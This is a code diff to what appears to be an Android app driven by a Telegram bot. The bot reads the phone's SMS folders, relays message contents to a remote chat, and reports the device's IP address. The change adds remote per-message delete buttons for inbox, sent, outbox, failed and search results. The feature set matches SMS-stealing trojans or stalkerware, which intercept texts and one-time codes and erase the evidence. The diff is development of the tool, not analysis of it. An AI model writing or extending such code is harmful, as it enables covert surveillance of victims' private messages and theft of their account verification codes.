@@ -151,13 +151,26 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
             // ── Pagination ──
             data.startsWith("page_") -> handlePagination(chatId, data)
 
-            // ── Delete failed message ──
+            // ── Smart delete — hybrid method for all Android versions ──
             data.startsWith("del_") -> {
-                val msgId = data.removePrefix("del_").toLongOrNull() ?: return
-                val success = SmsReader.deleteMessage(context, msgId)
-                if (success) sendMessage(chatId, "🗑️ Message deleted successfully.", null)
-                else sendMessage(chatId, "❌ Could not delete message.", null)
-                showFailed(chatId, getPage(chatId, "failed"))
+                // format: del_folder_msgId  e.g. del_inbox_12345
+                val parts = data.removePrefix("del_").split("_")
+                if (parts.size < 2) return
+                val folder = parts[0]
+                val msgId = parts[1].toLongOrNull() ?: return
+                val result = SmsReader.deleteMessage(context, msgId)
+                sendMessage(chatId, result.message, null)
+                // Refresh same folder and page after delete
+                when (folder) {
+                    "inbox"  -> showInbox(chatId, getPage(chatId, "inbox"))
+                    "sent"   -> showSent(chatId, getPage(chatId, "sent"))
+                    "outbox" -> showOutbox(chatId, getPage(chatId, "outbox"))
+                    "failed" -> showFailed(chatId, getPage(chatId, "failed"))
+                    "search" -> {
+                        val keyword = searchCache[chatId] ?: return
+                        showSearchResults(chatId, keyword, getPage(chatId, "search"))
+                    }
+                }
             }
 
             // ── Reconnect ──
@@ -325,7 +338,7 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
         val rows = JSONArray()
         messages.forEach { msg ->
             rows.put(JSONArray().apply {
-                put(btn("🗑️ Delete: ${msg.sender.take(15)}", "del_${msg.id}"))
+                put(btn("🗑️ Delete: ${msg.sender.take(15)}", "del_failed_${msg.id}"))
             })
         }
 
@@ -356,17 +369,23 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
         val sb = StringBuilder("🔍 *Results for \"$keyword\"* — $total found\nPage ${page + 1} of $totalPages\n\n")
         results.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
 
+        val rows = JSONArray()
+
+        // Delete button per search result
+        results.forEach { msg ->
+            rows.put(JSONArray().apply {
+                put(btn("🗑️ Delete: ${msg.sender.take(15)} [${msg.type.uppercase()}]", "del_search_${msg.id}"))
+            })
+        }
+
         val navRow = JSONArray()
         if (page > 0) navRow.put(btn("⬅️ Previous", "page_search_${page - 1}"))
         navRow.put(btn("🔍 New Search", "sms_search"))
         if ((page + 1) < totalPages) navRow.put(btn("➡️ Next", "page_search_${page + 1}"))
+        rows.put(navRow)
+        rows.put(JSONArray().apply { put(btn("🔙 Back", "sms_back")) })
 
-        sendMessage(chatId, sb.toString(), JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                put(navRow)
-                put(JSONArray().apply { put(btn("🔙 Back", "sms_back")) })
-            })
-        })
+        sendMessage(chatId, sb.toString(), JSONObject().apply { put("inline_keyboard", rows) })
     }
 
     // ─── Generic Folder Display ───────────────────────────────────────────────
@@ -384,16 +403,24 @@ ${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
         val sb = StringBuilder("$title — Page ${page + 1} of $totalPages\n\n")
         messages.forEach { sb.append(it.formatForTelegram()).append("\n─────────────\n") }
 
+        val rows = JSONArray()
+
+        // Delete button per message
+        messages.forEach { msg ->
+            rows.put(JSONArray().apply {
+                put(btn("🗑️ Delete: ${msg.sender.take(15)}", "del_${folder}_${msg.id}"))
+            })
+        }
+
+        // Navigation row
         val navRow = JSONArray()
         if (page > 0) navRow.put(btn("⬅️ Previous", "page_${folder}_${page - 1}"))
         if ((page + 1) < totalPages) navRow.put(btn("➡️ Next", "page_${folder}_${page + 1}"))
+        if (navRow.length() > 0) rows.put(navRow)
 
-        sendMessage(chatId, sb.toString(), JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                if (navRow.length() > 0) put(navRow)
-                put(JSONArray().apply { put(btn("🔙 Back", backCallback)) })
-            })
-        })
+        rows.put(JSONArray().apply { put(btn("🔙 Back", backCallback)) })
+
+        sendMessage(chatId, sb.toString(), JSONObject().apply { put("inline_keyboard", rows) })
     }
 
     // ─── Pagination Handler ───────────────────────────────────────────────────
